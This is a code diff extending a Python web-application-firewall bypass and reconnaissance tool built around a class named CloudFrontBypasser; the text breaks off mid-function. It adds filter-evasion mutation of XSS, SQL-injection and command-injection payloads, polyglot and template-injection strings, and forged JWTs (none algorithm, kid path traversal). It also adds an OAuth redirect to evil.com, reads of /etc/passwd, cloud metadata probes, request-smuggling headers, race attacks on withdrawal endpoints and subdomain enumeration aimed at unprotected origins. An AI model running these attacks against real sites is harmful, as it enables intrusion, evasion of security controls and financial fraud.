@@ -158,6 +158,132 @@ WAF_SIGNATURES = {
         'server': ['palo alto'],
         'body_patterns': ['palo alto', 'url filtering', 'block page'],
     },
+    'sqreen': {
+        'headers': ['x-sqreen-request-id', 'x-sqreen-transaction'],
+        'cookies': ['sq_'],
+        'server': ['sqreen'],
+        'body_patterns': ['sqreen', 'security monitoring', 'blocked by sqreen'],
+    },
+    'aws_appsync': {
+        'headers': ['x-amzn-appsync-', 'x-aws-appsync'],
+        'cookies': [],
+        'server': ['appsync'],
+        'body_patterns': ['appsync', 'graphql', 'x-amzn-requestid'],
+    },
+    'alibaba_waf': {
+        'headers': ['ali-cdn-real-ip', 'x-alicdn-da-ups-status', 'via'],
+        'cookies': ['aliyungf_tc', 'acw_tc', '__jsluid'],
+        'server': ['aliyun', 'alibaba', 'tengine'],
+        'body_patterns': ['aliyun', 'alibaba cloud', 'errors.aliyun', 'blocked by alibaba'],
+    },
+    'tencent_waf': {
+        'headers': ['x-tencent-', 'x-cdn-', 'x-nws-log-uuid'],
+        'cookies': ['tencent_', 'qcloud_'],
+        'server': ['tencent', 'qcloud', 'cdn-'],
+        'body_patterns': ['tencent', 'qcloud', 'blocked by waf', 'cdn.dnsv1.com'],
+    },
+}
+
+# JavaScript-based WAF/Bot Detection Signatures
+JAVASCRIPT_WAF_SIGNATURES = {
+    'perimeterx': {
+        'script_patterns': ['_px', 'PX', 'perimeterx', 'px-cdn', 'px.js', '/api/v2/collector'],
+        'cookies': ['_px', '_pxvid', '_pxhd', '_pxff_', '_px3', '_pxde'],
+        'body_patterns': ['perimeterx', 'human challenge', 'px-captcha', 'px-block'],
+        'headers': ['x-px-'],
+    },
+    'datadome': {
+        'script_patterns': ['datadome', 'dd.js', '/js/tags.js', 'ddjskey'],
+        'cookies': ['datadome', 'datadome-_'],
+        'body_patterns': ['datadome', 'dd-verify', 'robot or unusual traffic'],
+        'headers': ['x-datadome', 'x-dd-'],
+    },
+    'human_security': {
+        'script_patterns': ['px-client', 'human.js', '/px/client', '_human_'],
+        'cookies': ['__cf_bm', '_human', '__h_'],
+        'body_patterns': ['human security', 'bot detection', 'automated access'],
+        'headers': ['x-human-'],
+    },
+    'kasada': {
+        'script_patterns': ['kasada', '/149e9513-01fa-4fb0-aad4-566afd'],
+        'cookies': ['x-kpsdk', 'kpsdk', '_kp_'],
+        'body_patterns': ['kasada', 'bot protection'],
+        'headers': ['x-kpsdk-'],
+    },
+    'shape_security': {
+        'script_patterns': ['shape', '/api/p.js', 'shape-security'],
+        'cookies': ['_abck', 'bm_', 'ak_bmsc'],
+        'body_patterns': ['shape security', 'f5 shape'],
+        'headers': ['x-shape-'],
+    },
+    'distil': {
+        'script_patterns': ['distil', 'd-', 'distilidentifier'],
+        'cookies': ['D_', 'distilidentifier', 'd_'],
+        'body_patterns': ['distil', 'distil networks', 'imperva'],
+        'headers': ['x-distil-'],
+    },
+}
+
+# OWASP CRS Version Signatures
+OWASP_CRS_SIGNATURES = {
+    'crs_3.3': {
+        'patterns': ['CRS3.3', 'ModSecurity Core Rule Set 3.3', 'sec-rule-id-9'],
+        'rule_ids': [920, 930, 940, 941, 942, 943, 944],
+    },
+    'crs_3.2': {
+        'patterns': ['CRS3.2', 'ModSecurity Core Rule Set 3.2'],
+        'rule_ids': [920, 930, 940, 941, 942, 943],
+    },
+    'crs_3.1': {
+        'patterns': ['CRS3.1', 'ModSecurity Core Rule Set 3.1'],
+        'rule_ids': [920, 930, 940, 941, 942],
+    },
+    'crs_3.0': {
+        'patterns': ['CRS3.0', 'ModSecurity Core Rule Set 3.0'],
+        'rule_ids': [920, 930, 940, 941],
+    },
+    'crs_2.x': {
+        'patterns': ['CRS2', 'ModSecurity Core Rule Set 2', 'modsec2'],
+        'rule_ids': [950, 960, 970, 981],
+    },
+}
+
+# Technology Stack Signatures
+TECHNOLOGY_SIGNATURES = {
+    'frameworks': {
+        'django': {'headers': ['x-frame-options'], 'cookies': ['csrftoken', 'sessionid'], 'patterns': ['django', 'csrfmiddlewaretoken']},
+        'flask': {'headers': [], 'cookies': ['session'], 'patterns': ['werkzeug', 'flask']},
+        'rails': {'headers': ['x-runtime', 'x-request-id'], 'cookies': ['_session_id'], 'patterns': ['rails', 'ruby']},
+        'laravel': {'headers': [], 'cookies': ['laravel_session', 'XSRF-TOKEN'], 'patterns': ['laravel', 'blade']},
+        'express': {'headers': ['x-powered-by'], 'cookies': ['connect.sid'], 'patterns': ['express']},
+        'spring': {'headers': ['x-application-context'], 'cookies': ['JSESSIONID'], 'patterns': ['spring', 'java']},
+        'aspnet': {'headers': ['x-aspnet-version', 'x-aspnetmvc-version'], 'cookies': ['.aspnet', 'asp.net_sessionid'], 'patterns': ['asp.net', '__viewstate', '__eventvalidation']},
+        'nextjs': {'headers': ['x-nextjs-'], 'cookies': ['__next'], 'patterns': ['_next/', 'next.js']},
+        'nuxt': {'headers': [], 'cookies': [], 'patterns': ['nuxt', '_nuxt/']},
+    },
+    'cms': {
+        'wordpress': {'patterns': ['wp-content', 'wp-admin', 'wp-includes', 'wordpress'], 'cookies': ['wordpress_', 'wp-']},
+        'drupal': {'patterns': ['drupal', '/sites/default/', 'node/'], 'cookies': ['SSESS', 'Drupal']},
+        'joomla': {'patterns': ['joomla', '/administrator/', '/components/'], 'cookies': ['joomla']},
+        'magento': {'patterns': ['magento', '/mage/', 'varien'], 'cookies': ['PHPSESSID', 'frontend']},
+        'shopify': {'patterns': ['shopify', 'cdn.shopify.com'], 'cookies': ['_shopify']},
+    },
+    'servers': {
+        'nginx': {'patterns': ['nginx']},
+        'apache': {'patterns': ['apache', 'httpd']},
+        'iis': {'patterns': ['iis', 'microsoft']},
+        'tomcat': {'patterns': ['tomcat', 'apache-coyote']},
+        'gunicorn': {'patterns': ['gunicorn']},
+        'uvicorn': {'patterns': ['uvicorn']},
+    },
+    'languages': {
+        'php': {'headers': ['x-powered-by'], 'patterns': ['php/', '.php', 'phpsessid']},
+        'python': {'patterns': ['python', 'wsgi', 'gunicorn', 'uvicorn']},
+        'java': {'patterns': ['java', 'jsessionid', 'servlet']},
+        'ruby': {'patterns': ['ruby', 'rails', 'rack']},
+        'nodejs': {'patterns': ['node', 'express', 'x-powered-by: express']},
+        'dotnet': {'patterns': ['.net', 'asp.net', 'x-aspnet']},
+    },
 }
 
 # CDN Signatures
@@ -484,6 +610,26 @@ class CloudFrontBypasser:
             self._test_ipv6_bypass,
             self._test_bot_detection_evasion,
             self._test_api_endpoint_discovery,
+            
+            # === Extended Detection & Scanning ===
+            self._detect_waf_rule_version,
+            self._detect_javascript_waf,
+            self._test_graphql_bypass,
+            self._test_jwt_oauth_bypass,
+            
+            # === Advanced Attack Techniques ===
+            self._test_request_smuggling_v2,
+            self._test_payload_mutation,
+            self._test_polyglot_payloads,
+            self._test_time_based_detection,
+            self._test_race_condition,
+            
+            # === Reconnaissance Features ===
+            self._enumerate_subdomains,
+            self._historical_dns_lookup,
+            self._certificate_transparency_lookup,
+            self._test_cloud_metadata_enumeration,
+            self._fingerprint_technology_stack,
         ]
         
         # Execute techniques with error handling
@@ -827,9 +973,9 @@ class CloudFrontBypasser:
             for future in as_completed(futures):
                 try:
                     result = future.result()
-                    if result and result['bypass']:
+                    if result:
                         results.append(result)
-                        if verbose:
+                        if verbose and result.get('bypass'):
                             print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
                 except Exception as e:
                     logger.debug(f"Batch test error: {e}")
@@ -898,9 +1044,10 @@ class CloudFrontBypasser:
         
         for method in methods:
             result = self._test_request({'X-Technique': f'Method: {method}'}, method=method)
-            if result and result['bypass']:
+            if result:
                 results.append(result)
-                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
+                if result.get('bypass'):
+                    print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
         
         return results
     
@@ -1236,9 +1383,10 @@ class CloudFrontBypasser:
             # Try as both GET and POST
             for method in ['GET', 'POST']:
                 result = self._test_request(headers, method=method)
-                if result and result['bypass']:
+                if result:
                     results.append(result)
-                    print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
+                    if result.get('bypass'):
+                        print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
         
         return results
     
@@ -1465,15 +1613,15 @@ class CloudFrontBypasser:
                     resp = safe_request(ipv6_url, headers=headers, timeout=self.timeout)
                     if resp:
                         bypass_result = self._is_bypass(resp)
+                        result = {
+                            'technique': f'IPv6 Bypass: {ipv6_addr}',
+                            'bypass': bypass_result['bypass'],
+                            'status': resp.status_code,
+                            'reason': bypass_result['reason'],
+                            'severity': bypass_result['severity']
+                        }
+                        results.append(result)
                         if bypass_result['bypass']:
-                            result = {
-                                'technique': f'IPv6 Bypass: {ipv6_addr}',
-                                'bypass': True,
-                                'status': resp.status_code,
-                                'reason': bypass_result['reason'],
-                                'severity': bypass_result['severity']
-                            }
-                            results.append(result)
                             print(f"  [✓] BYPASS: IPv6 | {bypass_result['reason']} | {bypass_result['severity']}")
                 except Exception:
                     pass
@@ -1519,6 +1667,1015 @@ class CloudFrontBypasser:
             r['category'] = 'API_DISCOVERY'
             results.append(r)
             
+        return results
+
+    # ============================================================================
+    # EXTENDED DETECTION & SCANNING
+    # ============================================================================
+    
+    def _detect_waf_rule_version(self) -> List[Dict[str, Any]]:
+        """Detect WAF rule set versions (OWASP CRS, etc.)"""
+        results = []
+        print("  [*] Detecting WAF rule versions...")
+        
+        # Test payloads that trigger specific CRS rule IDs
+        version_test_payloads = [
+            # CRS 3.x specific patterns
+            ("/?test=<script>alert(1)</script>", "941", "XSS Detection"),
+            ("/?id=1' OR 1=1--", "942", "SQLi Detection"),
+            ("/?cmd=;cat /etc/passwd", "932", "RCE Detection"),
+            ("/?file=../../../etc/passwd", "930", "LFI Detection"),
+            ("/?url=http://169.254.169.254", "934", "SSRF Detection"),
+        ]
+        
+        detected_rules = []
+        
+        for payload_path, rule_prefix, rule_type in version_test_payloads:
+            try:
+                resp = safe_request(
+                    f"{self.target}{payload_path}",
+                    timeout=self.timeout,
+                    allow_redirects=False
+                )
+                if resp and resp.status_code in [403, 406, 501]:
+                    body_lower = resp.text.lower()
+                    
+                    # Look for rule IDs in response
+                    rule_id_match = re.search(r'rule[- _]?id[:\s]*(\d+)', body_lower)
+                    if rule_id_match:
+                        rule_id = rule_id_match.group(1)
+                        detected_rules.append({
+                            'rule_id': rule_id,
+                            'type': rule_type,
+                            'payload': payload_path[:30]
+                        })
+                    
+                    # Check for CRS version indicators
+                    for crs_version, crs_info in OWASP_CRS_SIGNATURES.items():
+                        for pattern in crs_info['patterns']:
+                            if pattern.lower() in body_lower:
+                                result = {
+                                    'technique': f'WAF Rule Version: {crs_version.upper()}',
+                                    'bypass': False,
+                                    'status': resp.status_code,
+                                    'reason': f'Detected pattern: {pattern}',
+                                    'severity': 'INFO',
+                                    'category': 'WAF_DETECTION'
+                                }
+                                results.append(result)
+                                print(f"  [+] Detected OWASP CRS Version: {crs_version}")
+                                
+            except Exception as e:
+                logger.debug(f"Rule version detection error: {e}")
+        
+        if detected_rules:
+            # Analyze rule IDs to determine CRS version
+            rule_ids = [int(r['rule_id'][:3]) for r in detected_rules if len(r['rule_id']) >= 3]
+            
+            # CRS 3.x uses 9xx rule IDs, CRS 2.x uses 95x, 96x, etc.
+            if any(r >= 920 and r <= 950 for r in rule_ids):
+                version_guess = "CRS 3.x (Modern)"
+            elif any(r >= 950 and r <= 990 for r in rule_ids):
+                version_guess = "CRS 2.x (Legacy)"
+            else:
+                version_guess = "Unknown CRS Version"
+            
+            result = {
+                'technique': f'WAF Rule Analysis: {version_guess}',
+                'bypass': False,
+                'status': 200,
+                'reason': f'Detected {len(detected_rules)} rule triggers',
+                'severity': 'INFO',
+                'category': 'WAF_DETECTION',
+                'details': {'detected_rules': detected_rules}
+            }
+            results.append(result)
+            print(f"  [+] WAF Rule Analysis: {version_guess}")
+        
+        return results
+    
+    def _detect_javascript_waf(self) -> List[Dict[str, Any]]:
+        """Detect client-side WAFs (PerimeterX, DataDome, HUMAN, etc.)"""
+        results = []
+        print("  [*] Detecting JavaScript-based WAF/Bot Protection...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            body_lower = resp.text.lower()
+            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
+            cookies_str = str(resp.cookies.get_dict()).lower()
+            
+            for js_waf_name, signatures in JAVASCRIPT_WAF_SIGNATURES.items():
+                confidence = 0
+                matched = []
+                
+                # Check script patterns in body
+                for pattern in signatures.get('script_patterns', []):
+                    if pattern.lower() in body_lower:
+                        confidence += 30
+                        matched.append(f"Script: {pattern}")
+                
+                # Check cookies
+                for cookie in signatures.get('cookies', []):
+                    if cookie.lower() in cookies_str:
+                        confidence += 25
+                        matched.append(f"Cookie: {cookie}")
+                
+                # Check body patterns
+                for pattern in signatures.get('body_patterns', []):
+                    if pattern.lower() in body_lower:
+                        confidence += 20
+                        matched.append(f"Body: {pattern}")
+                
+                # Check headers
+                for header in signatures.get('headers', []):
+                    if any(header.lower() in h for h in headers_lower):
+                        confidence += 25
+                        matched.append(f"Header: {header}")
+                
+                if confidence > 0:
+                    severity = 'HIGH' if confidence >= 60 else 'MEDIUM' if confidence >= 30 else 'LOW'
+                    result = {
+                        'technique': f'JS WAF Detection: {js_waf_name.upper()}',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': f"Confidence: {min(confidence, 100)}% - {', '.join(matched[:3])}",
+                        'severity': severity,
+                        'category': 'JS_WAF_DETECTION',
+                        'details': {'waf': js_waf_name, 'indicators': matched}
+                    }
+                    results.append(result)
+                    print(f"  [+] Detected JS WAF: {js_waf_name.upper()} (Confidence: {min(confidence, 100)}%)")
+            
+            if not results:
+                print("  [*] No JavaScript-based WAF detected")
+                
+        except Exception as e:
+            logger.debug(f"JS WAF detection error: {e}")
+        
+        return results
+    
+    def _test_graphql_bypass(self) -> List[Dict[str, Any]]:
+        """GraphQL-specific bypass testing - introspection, batching, complexity abuse"""
+        results = []
+        print("  [*] Testing GraphQL bypass techniques...")
+        
+        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/query']
+        
+        # GraphQL introspection query
+        introspection_query = '{"query": "{ __schema { types { name } } }"}'
+        
+        # Batching attack - multiple queries in one request
+        batch_query = '[{"query": "{ __typename }"}, {"query": "{ __schema { types { name } } }"}]'
+        
+        # Complexity/DoS attack - deeply nested query
+        complexity_query = '{"query": "{ users { friends { friends { friends { name } } } } }"}'
+        
+        # Field suggestion abuse
+        field_probe = '{"query": "{ user { __tyepname } }"}'  # Intentional typo for suggestions
+        
+        # Alias abuse for rate limit bypass
+        alias_query = '{"query": "{ a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id} }"}'
+        
+        graphql_tests = [
+            (introspection_query, 'GraphQL Introspection'),
+            (batch_query, 'GraphQL Batching'),
+            (complexity_query, 'GraphQL Complexity Abuse'),
+            (field_probe, 'GraphQL Field Suggestion'),
+            (alias_query, 'GraphQL Alias Abuse'),
+        ]
+        
+        for endpoint in graphql_endpoints:
+            for query, technique in graphql_tests:
+                try:
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        data=query,
+                        headers={
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json',
+                        },
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    if resp and resp.status_code == 200:
+                        try:
+                            json_resp = resp.json()
+                            # Check if we got actual data (not just errors)
+                            if 'data' in json_resp and json_resp['data'] is not None:
+                                result = {
+                                    'technique': f'{technique}: {endpoint}',
+                                    'bypass': True,
+                                    'status': resp.status_code,
+                                    'reason': 'GraphQL endpoint accessible',
+                                    'severity': 'HIGH' if 'introspection' in technique.lower() else 'MEDIUM',
+                                    'category': 'GRAPHQL_BYPASS'
+                                }
+                                results.append(result)
+                                print(f"  [✓] BYPASS: {technique} | Endpoint: {endpoint}")
+                        except:
+                            pass
+                            
+                except Exception as e:
+                    logger.debug(f"GraphQL test error for {endpoint}: {e}")
+        
+        return results
+    
+    def _test_jwt_oauth_bypass(self) -> List[Dict[str, Any]]:
+        """JWT/OAuth token bypass testing"""
+        results = []
+        print("  [*] Testing JWT/OAuth bypass techniques...")
+        
+        # Common JWT bypass techniques
+        jwt_tests = [
+            # Algorithm confusion - none algorithm
+            {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', 'technique': 'JWT None Algorithm'},
+            
+            # Null signature
+            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', 'technique': 'JWT Null Signature'},
+            
+            # Algorithm switch HS256 -> RS256 confusion
+            {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.test', 'technique': 'JWT RS256 Confusion'},
+            
+            # JWT with kid header injection
+            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT KID Path Traversal'},
+            
+            # JWT with jku header
+            {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Qvandrcy5qc29uIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT JKU Injection'},
+        ]
+        
+        # OAuth bypass techniques
+        oauth_tests = [
+            {'redirect_uri': 'https://evil.com', 'technique': 'OAuth Open Redirect'},
+            {'scope': 'admin openid profile', 'technique': 'OAuth Scope Escalation'},
+            {'response_type': 'token', 'technique': 'OAuth Implicit Flow'},
+        ]
+        
+        for test in jwt_tests:
+            headers = {k: v for k, v in test.items() if k != 'technique'}
+            technique = test['technique']
+            
+            result = self._test_request(
+                headers={**headers, 'X-Technique': technique},
+                method='GET',
+                path='/api/user'
+            )
+            
+            if result:
+                result['category'] = 'JWT_BYPASS'
+                results.append(result)
+                if result.get('bypass'):
+                    print(f"  [✓] BYPASS: {technique} | {result['reason']}")
+        
+        # Test OAuth endpoints
+        oauth_paths = ['/oauth/authorize', '/auth/authorize', '/oauth2/authorize']
+        for oauth_test in oauth_tests:
+            technique = oauth_test.pop('technique')
+            params = urlencode(oauth_test)
+            for path in oauth_paths:
+                result = self._test_request(
+                    headers={'X-Technique': technique},
+                    method='GET',
+                    path=f'{path}?{params}'
+                )
+                if result:
+                    result['category'] = 'OAUTH_BYPASS'
+                    results.append(result)
+        
+        return results
+
+    # ============================================================================
+    # ADVANCED ATTACK TECHNIQUES
+    # ============================================================================
+    
+    def _test_request_smuggling_v2(self) -> List[Dict[str, Any]]:
+        """Advanced request smuggling - H2.CL, H2.TE, HTTP/3 techniques"""
+        results = []
+        print("  [*] Testing advanced request smuggling (v2)...")
+        
+        smuggling_tests = [
+            # H2.CL - HTTP/2 with Content-Length manipulation
+            {
+                'headers': {
+                    'Content-Length': '0',
+                    'Transfer-Encoding': 'chunked',
+                    'X-HTTP2-Stream-ID': '1',
+                },
+                'method': 'POST',
+                'technique': 'H2.CL Smuggling'
+            },
+            # H2.TE - HTTP/2 with Transfer-Encoding
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'TE': 'trailers',
+                    'Connection': 'TE',
+                },
+                'method': 'POST',
+                'technique': 'H2.TE Smuggling'
+            },
+            # TE.TE with obfuscation variations
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'Transfer-encoding': 'identity',
+                },
+                'method': 'POST',
+                'technique': 'TE.TE Case Variation'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': ' chunked',
+                    'Transfer-Encoding': 'x',
+                },
+                'method': 'POST',
+                'technique': 'TE.TE Whitespace'
+            },
+            # CL.0 - Zero Content-Length
+            {
+                'headers': {
+                    'Content-Length': '0',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                'method': 'POST',
+                'technique': 'CL.0 Request Smuggling'
+            },
+            # HTTP/2 pseudo-header injection
+            {
+                'headers': {
+                    ':method': 'GET',
+                    ':path': '/admin',
+                    'Host': self.domain,
+                },
+                'method': 'GET',
+                'technique': 'HTTP/2 Pseudo-Header Injection'
+            },
+            # HTTP/3 QUIC-based smuggling attempt
+            {
+                'headers': {
+                    'Alt-Svc': 'h3=":443"; ma=86400',
+                    'Content-Length': '0',
+                },
+                'method': 'POST',
+                'technique': 'HTTP/3 Downgrade Attempt'
+            },
+        ]
+        
+        for test in smuggling_tests:
+            headers = test['headers'].copy()
+            headers['X-Technique'] = test['technique']
+            
+            result = self._test_request(
+                headers=headers,
+                method=test['method'],
+                path='/'
+            )
+            
+            if result:
+                result['category'] = 'REQUEST_SMUGGLING'
+                results.append(result)
+                if result.get('bypass'):
+                    print(f"  [✓] BYPASS: {test['technique']} | {result['reason']}")
+        
+        return results
+    
+    def _test_payload_mutation(self) -> List[Dict[str, Any]]:
+        """Payload mutation engine - automatically generate variations"""
+        results = []
+        print("  [*] Testing payload mutations...")
+        
+        # Base payloads to mutate
+        base_payloads = {
+            'xss': '<script>alert(1)</script>',
+            'sqli': "' OR 1=1--",
+            'rce': ';ls -la',
+        }
+        
+        # Mutation functions
+        def mutate_payload(payload: str) -> List[str]:
+            mutations = []
+            
+            # Case variations
+            mutations.append(payload.swapcase())
+            mutations.append(payload.upper())
+            mutations.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
+            
+            # URL encoding variations
+            mutations.append(quote(payload))
+            mutations.append(quote(quote(payload)))  # Double encode
+            
+            # Unicode variations
+            mutations.append(payload.replace('a', '\\u0061').replace('e', '\\u0065'))
+            
+            # Whitespace insertion
+            mutations.append(payload.replace(' ', '%09'))  # Tab
+            mutations.append(payload.replace(' ', '%0a'))  # Newline
+            mutations.append(payload.replace(' ', '%0d'))  # Carriage return
+            
+            # Comment insertion (for SQL/JS)
+            mutations.append(payload.replace(' ', '/**/'))
+            
+            # Null byte insertion
+            mutations.append(payload.replace('=', '%00='))
+            
+            # HTML entity encoding
+            mutations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
+            mutations.append(payload.replace('<', '&#60;').replace('>', '&#62;'))
+            
+            return mutations
+        
+        test_cases = []
+        for payload_type, base_payload in base_payloads.items():
+            for i, mutated in enumerate(mutate_payload(base_payload)[:5]):  # Limit to 5 mutations per type
+                test_cases.append({
+                    'headers': {},
+                    'path': f'/?test={quote_plus(mutated)}',
+                    'technique': f'Mutated {payload_type.upper()} #{i+1}'
+                })
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'PAYLOAD_MUTATION'
+            results.append(r)
+        
+        return results
+    
+    def _test_polyglot_payloads(self) -> List[Dict[str, Any]]:
+        """Polyglot payloads that work across multiple contexts"""
+        results = []
+        print("  [*] Testing polyglot payloads...")
+        
+        polyglots = [
+            # XSS/HTML/JS polyglot
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+            
+            # XSS/SQL polyglot
+            "'-var x=1;alert(1)//\\';",
+            
+            # Universal XSS polyglot
+            "-->'\"</script><script>alert(1)</script>",
+            
+            # SVG/XSS/Event polyglot
+            "<svg/onload=\"'`*/'/*`*/alert(1)/*`*/'>",
+            
+            # SQL/XSS polyglot
+            "1'<script>alert(1)</script>--",
+            
+            # Multiple context escape
+            "{{constructor.constructor('alert(1)')()}}",
+            
+            # Template injection polyglot
+            "${7*7}{{7*7}}<%=7*7%>${{7*7}}",
+            
+            # SSTI/XSS polyglot
+            "{{''.__class__.__mro__[2].__subclasses__()}}<script>alert(1)</script>",
+        ]
+        
+        test_cases = [
+            {'headers': {}, 'path': f'/?p={quote_plus(poly)}', 'technique': f'Polyglot #{i+1}'}
+            for i, poly in enumerate(polyglots)
+        ]
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'POLYGLOT'
+            results.append(r)
+        
+        return results
+    
+    def _test_time_based_detection(self) -> List[Dict[str, Any]]:
+        """Time-based blind detection through response timing analysis"""
+        results = []
+        print("  [*] Testing time-based blind detection...")
+        
+        # Time-based SQL injection payloads
+        timing_payloads = [
+            "/?id=1' AND SLEEP(2)--",
+            "/?id=1' AND BENCHMARK(5000000,SHA1('test'))--",
+            "/?id=1'; WAITFOR DELAY '0:0:2'--",
+            "/?id=1' AND pg_sleep(2)--",
+        ]
+        
+        # Baseline timing
+        try:
+            start = time.time()
+            resp = safe_request(self.target, timeout=self.timeout)
+            baseline_time = time.time() - start
+            
+            for payload_path in timing_payloads:
+                start = time.time()
+                resp = safe_request(
+                    f"{self.target}{payload_path}",
+                    timeout=self.timeout + 5  # Extended timeout for sleep payloads
+                )
+                elapsed = time.time() - start
+                
+                # If response took significantly longer (2+ seconds more than baseline)
+                if elapsed > baseline_time + 1.5:
+                    result = {
+                        'technique': f'Time-Based Detection: {payload_path[:30]}',
+                        'bypass': True,
+                        'status': resp.status_code if resp else 0,
+                        'reason': f'Response delayed by {elapsed - baseline_time:.1f}s',
+                        'severity': 'CRITICAL',
+                        'category': 'TIME_BASED'
+                    }
+                    results.append(result)
+                    print(f"  [✓] BYPASS: Time-based SQLi detected | Delay: {elapsed:.1f}s")
+                    
+        except Exception as e:
+            logger.debug(f"Time-based detection error: {e}")
+        
+        return results
+    
+    def _test_race_condition(self) -> List[Dict[str, Any]]:
+        """Race condition testing with concurrent requests"""
+        results = []
+        print("  [*] Testing race conditions...")
+        
+        race_endpoints = [
+            '/api/transfer',
+            '/api/withdraw',
+            '/checkout',
+            '/redeem',
+            '/apply-coupon',
+            '/vote',
+        ]
+        
+        def send_concurrent_requests(endpoint: str, count: int = 10) -> List[Dict]:
+            """Send concurrent requests to detect race conditions"""
+            responses = []
+            
+            def make_request():
+                try:
+                    start = time.time()
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        data={'amount': '1'},
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    return {
+                        'status': resp.status_code,
+                        'time': time.time() - start,
+                        'size': len(resp.content),
+                        'content_hash': hashlib.md5(resp.content).hexdigest()[:8]
+                    }
+                except:
+                    return None
+            
+            with ThreadPoolExecutor(max_workers=count) as executor:
+                futures = [executor.submit(make_request) for _ in range(count)]
+                for future in as_completed(futures):
+                    result = future.result()
+                    if result:
+                        responses.append(result)
+            
+            return responses
+        
+        for endpoint in race_endpoints:
+            try:
+                responses = send_concurrent_requests(endpoint, 5)
+                
+                if len(responses) >= 2:
+                    # Analyze for race condition indicators
+                    statuses = [r['status'] for r in responses]
+                    sizes = [r['size'] for r in responses]
+                    hashes = [r['content_hash'] for r in responses]
+                    
+                    # Different responses might indicate race condition
+                    if len(set(statuses)) > 1 or len(set(hashes)) > 1:
+                        result = {
+                            'technique': f'Race Condition: {endpoint}',
+                            'bypass': True,
+                            'status': statuses[0],
+                            'reason': f'Inconsistent responses detected ({len(set(hashes))} variations)',
+                            'severity': 'HIGH',
+                            'category': 'RACE_CONDITION'
+                        }
+                        results.append(result)
+                        print(f"  [✓] BYPASS: Race condition detected at {endpoint}")
+                        
+            except Exception as e:
+                logger.debug(f"Race condition test error for {endpoint}: {e}")
+        
+        return results
+
+    # ============================================================================
+    # RECONNAISSANCE FEATURES
+    # ============================================================================
+    
+    def _enumerate_subdomains(self) -> List[Dict[str, Any]]:
+        """Subdomain enumeration to find related domains without WAF protection"""
+        results = []
+        print("  [*] Enumerating subdomains...")
+        
+        # Common subdomain prefixes
+        subdomain_prefixes = [
+            'www', 'api', 'dev', 'staging', 'test', 'admin', 'portal',
+            'app', 'mail', 'ftp', 'vpn', 'remote', 'secure', 'login',
+            'beta', 'alpha', 'demo', 'internal', 'intranet', 'dashboard',
+            'cms', 'blog', 'shop', 'store', 'cdn', 'static', 'assets',
+            'origin', 'backend', 'server', 'db', 'database', 'mysql',
+            'api-v1', 'api-v2', 'v1', 'v2', 'legacy', 'old', 'new',
+        ]
+        
+        # Extract base domain
+        domain_parts = self.domain.split('.')
+        if len(domain_parts) >= 2:
+            base_domain = '.'.join(domain_parts[-2:])
+        else:
+            base_domain = self.domain
+        
+        found_subdomains = []
+        
+        def check_subdomain(prefix: str) -> Optional[Dict]:
+            subdomain = f"{prefix}.{base_domain}"
+            try:
+                # DNS resolution
+                ip = socket.gethostbyname(subdomain)
+                
+                # Try to connect
+                test_url = f"https://{subdomain}"
+                resp = safe_request(test_url, timeout=3, allow_redirects=True)
+                
+                if resp:
+                    return {
+                        'subdomain': subdomain,
+                        'ip': ip,
+                        'status': resp.status_code,
+                        'server': resp.headers.get('server', 'Unknown')
+                    }
+            except socket.gaierror:
+                pass  # DNS resolution failed
+            except Exception:
+                pass
+            return None
+        
+        # Parallel subdomain checking
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(check_subdomain, prefix): prefix for prefix in subdomain_prefixes}
+            
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    found_subdomains.append(result)
+        
+        for sub in found_subdomains:
+            # Check if subdomain might lack WAF protection
+            is_potentially_unprotected = sub['server'].lower() not in ['cloudflare', 'cloudfront', 'akamai']
+            
+            result = {
